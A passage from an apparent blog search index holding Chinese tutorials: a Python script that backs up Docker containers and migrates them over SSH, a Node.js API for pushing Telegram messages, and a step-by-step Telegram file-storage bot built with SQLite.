info[\u0026#39;NetworkSettings\u0026#39;][\u0026#39;Networks\u0026#39;].items(): if net_info is None: continue networks[net_name] = { \u0026#39;Aliases\u0026#39;: net_info.get(\u0026#39;Aliases\u0026#39;) or [], \u0026#39;IPAddress\u0026#39;: net_info.get(\u0026#39;IPAddress\u0026#39;) } return ports, volumes, envs, networks def export_container(name, image_name): subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;commit\u0026#34;, name, image_name], check=True) tar_file = f\u0026#34;{image_name}.tar\u0026#34; subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;save\u0026#34;, \u0026#34;-o\u0026#34;, tar_file, image_name], check=True) return tar_file def save_container_config(name, ports, volumes, envs, networks): config_file = f\u0026#34;{name}_image_config.json\u0026#34; config = { \u0026#34;ports\u0026#34;: ports, \u0026#34;volumes\u0026#34;: volumes, \u0026#34;envs\u0026#34;: envs, \u0026#34;networks\u0026#34;: networks } with open(config_file, \u0026#34;w\u0026#34;) as f: json.dump(config, f, indent=4) print(f\u0026#34;容器配置已保存为 {config_file}\u0026#34;) return config_file def transfer_file(local_file, target_host, target_user, target_path, port=22, password=None, key_filename=None): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, port=port, username=target_user, password=password, key_filename=key_filename) sftp = ssh.open_sftp() sftp.put(local_file, os.path.join(target_path, os.path.basename(local_file))) sftp.close() ssh.close() def restore_container(tar_file, container_name, ports, volumes, envs, networks, local=True, target_host=None, target_user=None, target_path=None, port=22, password=None, key_filename=None): port_args = \u0026#34; \u0026#34;.join([f\u0026#34;-p {v[0][\u0026#39;HostPort\u0026#39;]}:{k.split(\u0026#39;/\u0026#39;)[0]}\u0026#34; for k,v in ports.items()]) volume_args = \u0026#34; \u0026#34;.join([f\u0026#34;-v {v[\u0026#39;Source\u0026#39;]}:{v[\u0026#39;Destination\u0026#39;]}\u0026#34; for v in volumes]) env_args = \u0026#34; \u0026#34;.join([f\u0026#34;-e {e}\u0026#34; for e in envs]) image_name = os.path.basename(tar_file).replace(\u0026#39;.tar\u0026#39;,\u0026#39;\u0026#39;) run_cmd = f\u0026#34;docker run -d --name {container_name} {port_args} {volume_args} {env_args} {image_name}\u0026#34; if local: subprocess.run(f\u0026#34;docker load -i {tar_file}\u0026#34;, shell=True, check=True) subprocess.run(run_cmd, shell=True, check=True) for net_name, net_cfg in networks.items(): if net_cfg is None: continue aliases = net_cfg.get(\u0026#39;Aliases\u0026#39;) or [] subprocess.run(f\u0026#34;docker network inspect {net_name} || docker network create {net_name}\u0026#34;, shell=True) for alias in aliases: subprocess.run(f\u0026#34;docker network connect --alias {alias} {net_name} {container_name}\u0026#34;, shell=True) print(f\u0026#34;容器 {container_name} 已在本地启动。\u0026#34;) else: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, port=port, username=target_user, password=password, key_filename=key_filename) ssh.exec_command(f\u0026#34;docker load -i {os.path.join(target_path, os.path.basename(tar_file))}\u0026#34;) ssh.exec_command(run_cmd) for net_name, net_cfg in networks.items(): if net_cfg is None: continue aliases = net_cfg.get(\u0026#39;Aliases\u0026#39;) or [] ssh.exec_command(f\u0026#34;docker network inspect {net_name} || docker network create {net_name}\u0026#34;) for alias in aliases: ssh.exec_command(f\u0026#34;docker network connect --alias {alias} {net_name} {container_name}\u0026#34;) ssh.close() print(f\u0026#34;容器 {container_name} 已在远程服务器 {target_host} 启动。\u0026#34;) def export_flow(batch=False): containers = list_containers() print(\u0026#34;本地运行容器列表：\u0026#34;) for idx, c in enumerate(containers): print(f\u0026#34;{idx}: {c}\u0026#34;) if batch: choices = input(\u0026#34;输入要导出的容器编号(多个用逗号隔开，例如0,2,3): \u0026#34;) choices = [int(x.strip()) for x in choices.split(\u0026#34;,\u0026#34;)] else: choice = int(input(\u0026#34;选择要导出的容器编号: \u0026#34;)) choices = [choice] exported = [] for idx in choices: container_name = containers[idx] ports, volumes, envs, networks = inspect_container(container_name) print(f\u0026#34;导出容器 {container_name} 中...\u0026#34;) tar_file = export_container(container_name, container_name + \u0026#34;_image\u0026#34;) print(f\u0026#34;镜像已导出为 {tar_file}\u0026#34;) config_file = save_container_config(container_name, ports, volumes, envs, networks) exported.append((tar_file, config_file, container_name, ports, volumes, envs, networks)) do_transfer = input(\u0026#34;是否传输到目标服务器？(y/n): \u0026#34;).strip().lower() if do_transfer == \u0026#39;y\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;).strip() target_port = int(input(\u0026#34;目标服务器SSH端口(默认22): \u0026#34;).strip() or 22) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;).strip() auth_method = input(\u0026#34;使用方式 1-密码登录 2-私钥登录: \u0026#34;).strip() password = None key_filename = None if auth_method == \u0026#39;1\u0026#39;: password = getpass(\u0026#34;输入目标服务器密码: \u0026#34;) elif auth_method == \u0026#39;2\u0026#39;: key_filename = input(\u0026#34;输入私钥路径: \u0026#34;).strip() else: print(\u0026#34;无效认证方式\u0026#34;) return target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;).strip() for tar_file, config_file, container_name, ports, volumes, envs, networks in exported: print(f\u0026#34;传输 {container_name} 镜像和配置文件中...\u0026#34;) transfer_file(tar_file, target_host, target_user, target_path, port=target_port, password=password, key_filename=key_filename) transfer_file(config_file, target_host, target_user, target_path, port=target_port, password=password, key_filename=key_filename) print(f\u0026#34;在目标服务器恢复容器 {container_name}...\u0026#34;) restore_container(tar_file, container_name, ports, volumes, envs, networks, local=False, target_host=target_host, target_user=target_user, target_path=target_path, port=target_port, password=password, key_filename=key_filename) print(\u0026#34;批量迁移完成！\u0026#34;) else: print(\u0026#34;镜像和配置文件已保存到本地，未传输到服务器。\u0026#34;) def import_flow(batch=False): if batch: dir_path = input(\u0026#34;输入包含镜像的目录路径: \u0026#34;).strip() if not os.path.isdir(dir_path): print(\u0026#34;目录不存在！\u0026#34;) return tar_files = [os.path.join(dir_path, f) for f in os.listdir(dir_path) if f.endswith(\u0026#34;.tar\u0026#34;)] if not tar_files: print(\u0026#34;目录中没有 .tar 文件！\u0026#34;) return else: tar_file = input(\u0026#34;输入本地镜像文件路径 (.tar): \u0026#34;).strip() tar_files = [tar_file] mode = input(\u0026#34;选择导入模式：1-本地导入 2-远程导入: \u0026#34;).strip() password = None key_filename = None target_port = 22 if mode == \u0026#39;2\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;).strip() target_port = int(input(\u0026#34;目标服务器SSH端口(默认22): \u0026#34;).strip() or 22) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;).strip() auth_method = input(\u0026#34;使用方式 1-密码登录 2-私钥登录: \u0026#34;).strip() if auth_method == \u0026#39;1\u0026#39;: password = getpass(\u0026#34;输入目标服务器密码: \u0026#34;) elif auth_method == \u0026#39;2\u0026#39;: key_filename = input(\u0026#34;输入私钥路径: \u0026#34;).strip() else: print(\u0026#34;无效认证方式\u0026#34;) return target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;).strip() for tar_file in tar_files: config_file = tar_file.replace(\u0026#39;.tar\u0026#39;, \u0026#39;_config.json\u0026#39;) container_name = os.path.basename(tar_file).replace(\u0026#39;_image.tar\u0026#39;,\u0026#39;\u0026#39;) if not os.path.exists(config_file): print(f\u0026#34;配置文件 {config_file} 不存在，无法恢复端口、卷、环境变量和网络！\u0026#34;) ports, volumes, envs, networks = {}, [], [], {} else: with open(config_file, \u0026#39;r\u0026#39;) as f: cfg = json.load(f) ports, volumes, envs, networks = cfg.get(\u0026#39;ports\u0026#39;, {}), cfg.get(\u0026#39;volumes\u0026#39;, []), cfg.get(\u0026#39;envs\u0026#39;, []), cfg.get(\u0026#39;networks\u0026#39;, {}) print(f\u0026#34;恢复容器 {container_name} ...\u0026#34;) if mode == \u0026#39;1\u0026#39;: restore_container(tar_file, container_name, ports, volumes, envs, networks, local=True) elif mode == \u0026#39;2\u0026#39;: transfer_file(tar_file, target_host, target_user, target_path, port=target_port, password=password, key_filename=key_filename) if os.path.exists(config_file): transfer_file(config_file, target_host, target_user, target_path, port=target_port, password=password, key_filename=key_filename) restore_container(tar_file, container_name, ports, volumes, envs, networks, local=False, target_host=target_host, target_user=target_user, target_path=target_path, port=target_port, password=password, key_filename=key_filename) print(\u0026#34;批量导入完成！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;选择操作：\u0026#34;) print(\u0026#34;1: 导出容器到本地镜像\u0026#34;) print(\u0026#34;2: 将本地镜像导入并恢复容器\u0026#34;) print(\u0026#34;3: 批量导出容器\u0026#34;) print(\u0026#34;4: 批量导入镜像并恢复容器（目录模式）\u0026#34;) choice = input(\u0026#34;输入操作编号: \u0026#34;).strip() if choice == \u0026#39;1\u0026#39;: export_flow(batch=False) elif choice == \u0026#39;2\u0026#39;: import_flow(batch=False) elif choice == \u0026#39;3\u0026#39;: export_flow(batch=True) elif choice == \u0026#39;4\u0026#39;: import_flow(batch=True) else: print(\u0026#34;无效选择！\u0026#34;) ","permalink":"https://qfsyso.github.io/posts/docker-bakup/","summary":"Dcoker Bakup 导出时生成 .tar + _config.json，记录容器端口、卷挂载和环境变量。\n导入时自动读取配置文件，本地导入或远程导入都能恢复原容器配置。\n支持本地导入：无需输入服务器信息。\n支持远程导入：传输 .tar 和 .json 到服务器，并在服务器上启动容器。\nCode python3 -m venv myenv source myenv/bin/activate import os import json import subprocess import paramiko def list_containers(): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;ps\u0026#34;, \u0026#34;--format\u0026#34;, \u0026#34;{{.Names}}\u0026#34;], capture_output=True, text=True) containers = result.stdout.strip().split(\u0026#34;\\n\u0026#34;) return containers def inspect_container(name): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, name], capture_output=True, text=True) info = json.loads(result.stdout)[0] ports = info[\u0026#39;HostConfig\u0026#39;][\u0026#39;PortBindings\u0026#39;] volumes = info[\u0026#39;Mounts\u0026#39;] envs = info[\u0026#39;Config\u0026#39;][\u0026#39;Env\u0026#39;] return ports, volumes, envs def export_container(name, image_name): subprocess.","title":"Docker Bakup"},{"content":"Push TG Bot Node.js 写一个 API，结合 Telegram Bot，可以通过 API 推送消息。 使用 Express 创建 API，利用 Telegram Bot API 发送消息。\n创建 TG 机器人 1.打开 TG，搜索 BotFather。 2.发送 /newbot ，按步骤创建一个新机器人。 3.创建完成后会得到一个 Bot Token，例如: 123456789:ABCDefGhIJKlmnoPQRstuVWXyz\n初始化 mkdir telegram-push-api cd telegram-push-api npm init -y npm install express axios body-parser 核心代码 const express = require(\u0026#39;express\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); app.use(bodyParser.json()); // API: POST /api/push/:bottoken app.post(\u0026#39;/api/push/:bottoken\u0026#39;, async (req, res) =\u0026gt; { const botToken = req.params.bottoken; // TG Bot Token const { chat_id, msg } = req.body; // 消息目标 chat_id 和消息内容 if (!chat_id || !msg) { return res.status(400).json({ error: \u0026#39;chat_id and msg are required in body\u0026#39; }); } const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`; try { const response = await axios.post(telegramApiUrl, { chat_id: chat_id, text: msg }); res.json({ success: true, result: response.data }); } catch (error) { console.error(error.response?.data || error.message); res.status(500).json({ success: false, error: error.response?.data || error.message }); } }); const PORT = 3000; app.listen(PORT, () =\u0026gt; { console.log(`Telegram Push API running at http://localhost:${PORT}`); }); 获取 chat_id： 可以通过向机器人发送消息，然后访问：\nhttps://api.telegram.org/bot\u0026lt;BOT_TOKEN\u0026gt;/getUpdates\n获取 chat.id\n运行 curl -X POST http://localhost:3000/api/push/\u0026lt;TK\u0026gt; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;chat_id\u0026#34;: \u0026#34;\u0026lt;CHATID\u0026gt;\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;Hello World!\u0026#34;}\u0026#39; {\u0026#34;success\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;message_id\u0026#34;:3,\u0026#34;from\u0026#34;:{\u0026#34;id\u0026#34;:8421809462,\u0026#34;is_bot\u0026#34;:true,\u0026#34;first_name\u0026#34;:\u0026#34;tml\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;sptml_bot\u0026#34;},\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:\u0026lt;CHATID\u0026gt;,\u0026#34;first_name\u0026#34;:\u0026#34;Qoo\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;Iu\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;private\u0026#34;},\u0026#34;date\u0026#34;:1756199650,\u0026#34;text\u0026#34;:\u0026#34;Hello World!\u0026#34;}}} 结果\nXXX , [2025/8/26 17:11] /start XXX , [2025/8/26 17:12] 111 tml, [2025/8/26 17:14] Hello World! Next /api/push// 就能直接发送 无需传 chat_id，并且支持多个用户或群组推送消息。\n","permalink":"https://qfsyso.github.io/posts/push-tg-bot/","summary":"Push TG Bot Node.js 写一个 API，结合 Telegram Bot，可以通过 API 推送消息。 使用 Express 创建 API，利用 Telegram Bot API 发送消息。\n创建 TG 机器人 1.打开 TG，搜索 BotFather。 2.发送 /newbot ，按步骤创建一个新机器人。 3.创建完成后会得到一个 Bot Token，例如: 123456789:ABCDefGhIJKlmnoPQRstuVWXyz\n初始化 mkdir telegram-push-api cd telegram-push-api npm init -y npm install express axios body-parser 核心代码 const express = require(\u0026#39;express\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); app.use(bodyParser.json()); // API: POST /api/push/:bottoken app.post(\u0026#39;/api/push/:bottoken\u0026#39;, async (req, res) =\u0026gt; { const botToken = req.","title":"Push TG Bot"},{"content":"Node.js TG 文件管理机器人，支持分类存储、分页浏览、搜索、下载、删除文件，同时支持图片缩略图预览和服务器本地下载。\n功能 文件分类管理：支持用户自定义分类。\n文件上传自动保存：支持文档、图片、视频，并记录上传用户和分类。\n分页查看文件列表：可分页显示最近上传的文件。\n图片缩略图：在分页列表中显示图片缩略图。\n文件搜索：按文件名关键字搜索文件。\n获取文件：支持发送文件回 Telegram。\n删除文件：支持单个文件删除，带确认机制。\n下载到本地：将文件下载到服务器本地，支持重试和错误提示。\n命令： /start # 欢迎信息和操作提示 /setcategory # 设置文件分类 /myfiles # 查看最近 10 条文件 /myfilelist [页码] # 分页显示文件列表 /search 关键字 # 搜索文件 /getfile id # 获取文件到 Telegram /delete id # 删除文件\n按钮操作： 分类选择：在 /setcategory 后点击按钮设置分类。\n删除文件：点击“删除”按钮，带确认操作。\n下载文件：点击“下载本地”按钮，将文件下载到服务器本地。\n分页：点击上一页/下一页翻页。\n文件存储 默认本地存储目录：./files/分类名/文件名\n支持自动创建分类目录。\n图片会在分页列表显示缩略图。\n错误处理和日志\n文件下载支持 3 次重试，失败会输出控制台日志。\n用户端收到友好提示，不会导致 bot 崩掉。\n依赖 node-telegram-bot-api sqlite3 axios Node.js \u0026gt;= 16 项目目录结构 bot.js # 主程序 db.js # SQLite 数据库封装 files/ # 本地文件存储目录 node_modules/ # 依赖库 package.json\n注意事项 确保服务器可以访问 Telegram API（国内可能需要代理）。\ntoken 必须正确，且 bot 有文件读取权限。\n图片缩略图通过 Telegram sendMediaGroup 实现，其他文件显示为文字列表。\n下载文件到本地时，如果失败会重试 3 次并记录日志。\nBot 在 BotFather 创建机器人 打开 TG，搜索 BotFather。\n输入 /start。\n输入 /newbot → 按提示给机器人取名字（例如：FileStorageBot）。\nBotFather 会返回一个 HTTP API Token，类似：\n1234567890:ABCdefGhIjKlmNoPQRstuVWxyZ 这个就是 Node.js 代码里要用的 BOT_TOKEN。\nNode.js 项目初始化 在服务器或本地环境里执行：\nmkdir tg-file-storage-bot cd tg-file-storage-bot npm init -y npm install node-telegram-bot-api sqlite3 node-telegram-bot-api → Telegram 机器人 SDK\nsqlite3 → 存储文件信息（文件分类、路径等）\n建 SQLite 数据库表 新建一个 db.js：\nconst sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const db = new sqlite3.Database(\u0026#39;./files.db\u0026#39;); db.serialize(() =\u0026gt; { db.run(` CREATE TABLE IF NOT EXISTS files ( id INTEGER PRIMARY KEY AUTOINCREMENT, file_id TEXT, file_name TEXT, category TEXT, user_id TEXT, date DATETIME DEFAULT CURRENT_TIMESTAMP ) `); }); module.exports = db; bot 新建 bot.js：\nconst TelegramBot = require(\u0026#39;node-telegram-bot-api\u0026#39;); const db = require(\u0026#39;./db\u0026#39;); const token = \u0026#34;TOKEN\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage(msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n/setcategory 分类名\\n/myfiles 查看我的文件\u0026#34;); }); // 设置分类 bot.onText(/\\/setcategory (.+)/, (msg, match) =\u0026gt; { const category = match[1]; userCategory[msg.from.id] = category; bot.sendMessage(msg.chat.id, `✅ 已设置分类为：${category}\\n请直接发送文件，我会帮存储。`); }); // 接收文件（文档） bot.on(\u0026#34;document\u0026#34;, async (msg) =\u0026gt; { const fileId = msg.document.file_id; const fileName = msg.document.file_name; const userId = msg.from.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], (err) =\u0026gt; { if (err) { console.error(err); bot.sendMessage(msg.chat.id, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage(msg.chat.id, `📂 文件已保存：${fileName}\\n分类：${category}`); } } ); }); // 查看文件列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // 回复 /getfile id 来取回文件 bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get(`SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); }); }); run node bot.js 然后在 TG 里打开机器人：\n/setcategory 工作资料 → 设置分类\n上传文件（文档、PDF、Zip 等）\n/myfiles → 查看自己存的文件\n/getfile 1 → 获取 ID=1 的文件\nXXX, [2025/8/26 9:37] /start mybot1, [2025/8/26 9:37] 欢迎使用文件存储机器人！ 命令： /setcategory 分类名 /myfiles 查看我的文件 inline keyboard search 新增分类 搜索\n//bot.js const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const token = \u0026#34;XXXTOKEN\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;工作\u0026#34;, \u0026#34;学习\u0026#34;, \u0026#34;生活\u0026#34;, \u0026#34;其他\u0026#34;]; // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n/setcategory 设置分类\\n/myfiles 查看我的文件\\n/search 关键字 搜索文件\\n/getfile id 获取文件\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 处理按钮点击 bot.on(\u0026#34;callback_query\u0026#34;, (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } bot.answerCallbackQuery(query.id); // 收起按钮 loading }); // 接收文件 bot.on(\u0026#34;document\u0026#34;, async (msg) =\u0026gt; { const fileId = msg.document.file_id; const fileName = msg.document.file_name; const userId = msg.from.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], (err) =\u0026gt; { if (err) { console.error(err); bot.sendMessage(msg.chat.id, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( msg.chat.id, `📂 文件已保存：${fileName}\\n分类：${category}` ); } } ); }); // 查看文件列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // 搜索文件 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // 回复 /getfile id 来取回文件 bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get( `SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } ); }); XXX, [2025/8/26 9:37] /start mybot1, [2025/8/26 9:37] 欢迎使用文件存储机器人！ 命令： /setcategory 分类名 /myfiles 查看我的文件 XXX, [2025/8/26 9:43] /start mybot1, [2025/8/26 9:43] 欢迎使用文件存储机器人！ 命令： /setcategory 设置分类 /myfiles 查看我的文件 /search 关键字 搜索文件 /getfile id 获取文件 XXX, [2025/8/26 9:43] /setcategory mybot1, [2025/8/26 9:43] 请选择分类： mybot1, [2025/8/26 9:43] ✅ 已设置分类为：其他 mybot1, [2025/8/26 9:45] 📂 文件已保存：ttsbot.zip 分类：其他 XXX, [2025/8/26 9:46] /search tts pic video //bot.js const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const token = \u0026#34;XXXTOKEN\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;工作\u0026#34;, \u0026#34;学习\u0026#34;, \u0026#34;生活\u0026#34;, \u0026#34;其他\u0026#34;]; // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n/setcategory 设置分类\\n/myfiles 查看文件\\n/search 关键字 搜索文件\\n/getfile id 获取文件\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: categories.map((c) =\u0026gt; [{ text: c, callback_data: `cat_${c}` }]), }, }; bot.sendMessage(msg.chat.id, \u0026#34;请选择分类：\u0026#34;, opts); }); // 处理按钮点击 bot.on(\u0026#34;callback_query\u0026#34;, (query) =\u0026gt; { const userId = query.from.id; const chatId = query.message.chat.id; if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } bot.answerCallbackQuery(query.id); // 收起按钮 loading }); // 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; db.run( `INSERT INTO files (file_id, file_name, category, user_id) VALUES (?, ?, ?, ?)`, [fileId, fileName, category, userId], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { bot.sendMessage( chatId, `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}` ); } } ); } // 监听文档（PDF, ZIP 等） bot.on(\u0026#34;document\u0026#34;, (msg) =\u0026gt; { const fileId = msg.document.file_id; const fileName = msg.document.file_name; saveFile(msg, fileId, fileName, \u0026#34;文档\u0026#34;); }); // 监听图片（包括转发的） bot.on(\u0026#34;photo\u0026#34;, (msg) =\u0026gt; { // photo 是数组，选最高分辨率的 const photo = msg.photo[msg.photo.length - 1]; const fileId = photo.file_id; const fileName = `photo_${Date.now()}.jpg`; saveFile(msg, fileId, fileName, \u0026#34;图片\u0026#34;); }); // 监听视频（包括转发的） bot.on(\u0026#34;video\u0026#34;, (msg) =\u0026gt; { const fileId = msg.video.file_id; const fileName = msg.video.file_name || `video_${Date.now()}.mp4`; saveFile(msg, fileId, fileName, \u0026#34;视频\u0026#34;); }); // 查看文件列表 bot.onText(/\\/myfiles/, (msg) =\u0026gt; { const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? ORDER BY date DESC LIMIT 10`, [userId], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;📭 没有找到文件。\u0026#34;); let text = \u0026#34;📂 最近的文件：\\n\\n\u0026#34;; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // 搜索文件 bot.onText(/\\/search (.+)/, (msg, match) =\u0026gt; { const keyword = `%${match[1]}%`; const userId = msg.from.id; db.all( `SELECT id, file_name, category FROM files WHERE user_id = ? AND file_name LIKE ? ORDER BY date DESC LIMIT 10`, [userId, keyword], (err, rows) =\u0026gt; { if (err) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 查询失败。\u0026#34;); if (rows.length === 0) return bot.sendMessage(msg.chat.id, \u0026#34;🔍 没有匹配的文件。\u0026#34;); let text = `🔍 搜索结果：\\n\\n`; rows.forEach((r) =\u0026gt; { text += `#${r.id} ${r.file_name} [${r.category}]\\n`; }); bot.sendMessage(msg.chat.id, text); } ); }); // 回复 /getfile id 来取回文件 bot.onText(/\\/getfile (\\d+)/, (msg, match) =\u0026gt; { const id = match[1]; db.get( `SELECT file_id, file_name FROM files WHERE id = ?`, [id], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(msg.chat.id, \u0026#34;❌ 文件不存在。\u0026#34;); // 根据扩展名类型发送不同消息 if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;)) { bot.sendPhoto(msg.chat.id, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(msg.chat.id, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(msg.chat.id, row.file_id, {}, { filename: row.file_name }); } } ); }); list const TelegramBot = require(\u0026#34;node-telegram-bot-api\u0026#34;); const db = require(\u0026#34;./db\u0026#34;); const token = \u0026#34;XXXTOKEN\u0026#34;; const bot = new TelegramBot(token, { polling: true }); // 保存分类信息（用户 -\u0026gt; 当前选择的分类） const userCategory = {}; // 预设分类 const categories = [\u0026#34;工作\u0026#34;, \u0026#34;学习\u0026#34;, \u0026#34;生活\u0026#34;, \u0026#34;其他\u0026#34;]; // 每页显示条数 const PAGE_SIZE = 5; // /start 命令 bot.onText(/\\/start/, (msg) =\u0026gt; { bot.sendMessage( msg.chat.id, \u0026#34;欢迎使用文件存储机器人！\\n\\n命令：\\n\u0026#34; + \u0026#34;/setcategory 设置分类\\n\u0026#34; + \u0026#34;/myfiles 查看最近文件(文字列表)\\n\u0026#34; + \u0026#34;/myfilelist [页码] 文件预览分页\\n\u0026#34; + \u0026#34;/search 关键字 搜索文件\\n\u0026#34; + \u0026#34;/getfile id 获取文件\u0026#34; ); }); // /setcategory 显示按钮 bot.onText(/\\/setcategory/, (msg) =\u0026gt; { const opts = { reply_markup: { inline_keyboard: 